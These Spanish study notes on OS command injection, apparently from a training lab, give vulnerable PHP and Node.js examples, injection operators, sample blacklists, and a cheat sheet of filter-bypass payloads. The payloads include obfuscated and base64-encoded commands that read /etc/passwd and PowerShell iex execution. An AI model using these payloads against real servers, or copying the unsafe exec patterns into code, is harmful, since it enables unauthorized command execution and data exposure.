#web #vuln 

### OS Command injection

Es la inyección de código que se ejecuta directamente en el servidor víctima, podría ser con alguna función que ejecuta código.

#### PHP
Hay funciones como exec, system, shell_exec, passthru o popen que ejecutan comandos directamente en el backend.

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

El input se introduce directamente en a función system, por lo que se podría inyectar código.

#### NodeJs
Las funciones que ejecutan código son algunas como child_process.exec o child_process.spawn que hace lo mismo que las anteriores de PHP.

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```


#### Métodos

Los command injection se pueden detectar cuando se ejecuta un código en función a un parámetro que introductas. Varias expresiones utilizadas en las inyecciones de comandos son las siguientes:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

### Bypassing front-end validation

Una forma común de evitar las inyecciones de código es validar la entrada para evitar los caracteres con los que se podría ejecutar más código que serían los de a tabla anterior.

Cuando esto se analiza en la parte del front-end se puede interceptar la petición con burp-suite y escribir directamente el payload después de ser procesado, también se puede bypassear escribiendolo en hexadecimal los caracteres no permitidos.

### Operadores

Existen dos principalmente que usaremos.

#### AND

Se ejecutan ambos comandos, es una intersección. Sería de esta forma:

ping 127.0.0.1 && whoami, se ejecuta el ping y el whoami.

#### OR

Se ejecuta un comando u otro, se puede escribir de dos formas, || o OR.
Si en el ejemplo anterior se ejecuta el comando ping el comando whoami no llegará a ejecutarse.

#### New-line

El carácter de nueva línea sería como hacer un intro en la terminal víctima y poder escribir nuevos comandos para que se ejecute código malicioso que le introduzcamos. Tiene esta forma: %0a

#### Operadores en inyecciones
| **Injection Type** | **Operators** |
| ---- | ---- |
| SQL Injection | `'` `,` `;` `--` `/* */` |
| Command Injection | `;` `&&` |
| LDAP Injection | `*` `(` `)` `&` `\|` |
| XPath Injection | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection | `;` `&` `\|` |
| Code Injection | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^` |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00` |
| Object Injection | `;` `&` `\|` |
| XQuery Injection | `'` `;` `--` `/* */` |
| Shellcode Injection | `\x` `\u` `%u` `%n` |
| Header Injection | `\n` `\r\n` `\t` `%0d` `%0a` `%09` |

### Filter detection

Cuando al intentar hacer una petición maliciosa recibimos un error de input inválido o nos redirige a alguna pestaña significa que existe una blacklist de carácter que rechaza el input. El primer paso sería encontrar los elementos de la blacklist con pruebas.

La blacklist se procesa en el código PHP y tendría esta forma:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

### Bypassing

#### Space Filters
1. Tabs
	Una técnica que puede funcionar es utilizar tabuladores en lugar de espacios(%09). Se utiliza cuando es necesario un espacio para la ejecución del comando.
2. $IFS
	La variable de entorno de linux $IFS tiene como contenido predeterminado un espacio o un tabulador.
3. Brace Expansion
	Para poder introducir comandos con flags se puede utilizar {ls,-al}

#### Other characters

Aunque no existen variables de entorno con otros caracteres, se pueden especificar un fragmento de la variable.

1. Slash(/)
	Por ejemplo en este caso se puede utilizar la variable de entorno PATH.
	Si hacemos un echo a la variable PATH muestra esto:
	/usr/local/bin:/usr/bin:/bin:/usr/games
	Si hacemos echo ${PATH:0:1} nos mostraría solo el primer carácter, es decir el slash que buscábamos.
2. Semi-colon(;)
	La misma forma que el ejemplo anterior pero con la variable de entorno LS_COLORS:10:1

##### WINDOWS

Para hacer lo mismo que en los anteriores ejemplos pero en el CMD de windows.

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

Para la powershell se procedería más parecido a linux.
```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\
```

Para listar todas las variables de entorno en powershell lo haríamos con el siguiente comando:
Get-ChildItem Env:
Incluyendo los dos puntos.

#### Black listed commands

Es posible que el PHP tenga en su blacklist también palabras.
```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

Esto evita que ejecuten comandos peligrosos.

Para poder saltarlo se puede utilizar "" o '' de esta forma.

```shell-session
21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

Lo que juntaría los caracteres haciendo el comando, no se pueden juntar tipos de comillas y su número debe ser par. Esto funciona tanto para windows como para linux.

Otra forma de hacerlo exclusivamente en linux sería:
```bash
who$@ami
w\ho\am\i
```
La shell simplemente ignorará los caracteres intermedios.

En cuanto a windows podemos utilizar ^.

```cmd-session
C:\htb> who^ami

21y4d
```

#### Command ofuscation

Si nos enfrentamos a un servidor windows, cmd y power-shell se puede intercambiar mayúsculas y minúsculas:
```powershell-session
PS C:\htb> WhOaMi

21y4d
```

En el caso de linux es más complicado ya que es case-sensitive y diferencia entre mayúsculas y minúsculas. Por ello tendríamos que usar comandos con el siguiente para intercambiar las mayúsculas por las minúsculas.

```shell-session
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

Este comando utiliza espacios por lo que habría que ir al bypassing de blacklisted space.

Otros comandos que se pueden utilizar igual sería:
```bash
$(a="WhOaMi";printf %s "${a,,}")
```


#### Reversed commands

Para poder bypassear una blacklist de comandos podemos hacer un reverse, dar la vuelta al orden de las letras. En lugar de poner whoami usar imaohw.

```shell-session
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```

Lo mismo se puede hacer en windows.
```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

#### Encoded commands

También se puede encodear los comandos, por ejemplo en base64 o en hexadecimal(xxd).

```shell-session
Astharot15@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```
(En este ejemplo se utiliza < para evitar usar |)

Si tenemos alguno de los comandos filtrados podemos usar el blacklisted commands bypass o utilizar en lugar de bash, sh y openssl en lugar de base64.

En WINDOWS se haría de las misma forma.
```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```




### Cheat-sheet

## Injection Operators

|**Injection Operator**|**Injection Character**|**URL-Encoded Character**|**Executed Command**|
|---|---|---|---|
|Semicolon|`;`|`%3b`|Both|
|New Line|`\n`|`%0a`|Both|
|Background|`&`|`%26`|Both (second output generally shown first)|
|Pipe|`\|`|`%7c`|Both (only second output is shown)|
|AND|`&&`|`%26%26`|Both (only if first succeeds)|
|OR|`\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell|` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|

---

# Linux

## Filtered Character Bypass

|Code|Description|
|---|---|
|`printenv`|Can be used to view all environment variables|
|**Spaces**||
|`%09`|Using tabs instead of spaces|
|`${IFS}`|Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`)|
|`{ls,-la}`|Commas will be replaced with spaces|
|**Other Characters**||
|`${PATH:0:1}`|Will be replaced with `/`|
|`${LS_COLORS:10:1}`|Will be replaced with `;`|
|`$(tr '!-}' '"-~'<<<[)`|Shift character by one (`[` -> `\`)|

---

## Blacklisted Command Bypass

|Code|Description|
|---|---|
|**Character Insertion**||
|`'` or `"`|Total must be even|
|`$@` or `\`|Linux only|
|**Case Manipulation**||
|`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`|Execute command regardless of cases|
|`$(a="WhOaMi";printf %s "${a,,}")`|Another variation of the technique|
|**Reversed Commands**||
|`echo 'whoami' \| rev`|Reverse a string|
|`$(rev<<<'imaohw')`|Execute reversed command|
|**Encoded Commands**||
|`echo -n 'cat /etc/passwd \| grep 33' \| base64`|Encode a string with base64|
|`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`|Execute b64 encoded string|

---

# Windows

## Filtered Character Bypass

|Code|Description|
|---|---|
|`Get-ChildItem Env:`|Can be used to view all environment variables - (PowerShell)|
|**Spaces**||
|`%09`|Using tabs instead of spaces|
|`%PROGRAMFILES:~10,-5%`|Will be replaced with a space - (CMD)|
|`$env:PROGRAMFILES[10]`|Will be replaced with a space - (PowerShell)|
|**Other Characters**||
|`%HOMEPATH:~0,-17%`|Will be replaced with `\` - (CMD)|
|`$env:HOMEPATH[0]`|Will be replaced with `\` - (PowerShell)|

---

## Blacklisted Command Bypass

|Code|Description|
|---|---|
|**Character Insertion**||
|`'` or `"`|Total must be even|
|`^`|Windows only (CMD)|
|**Case Manipulation**||
|`WhoAmi`|Simply send the character with odd cases|
|**Reversed Commands**||
|`"whoami"[-1..-20] -join ''`|Reverse a string|
|`iex "$('imaohw'[-1..-20] -join '')"`|Execute reversed command|
|**Encoded Commands**||
|`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`|Encode a string with base64|
|`iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`|Execute b64 encoded string|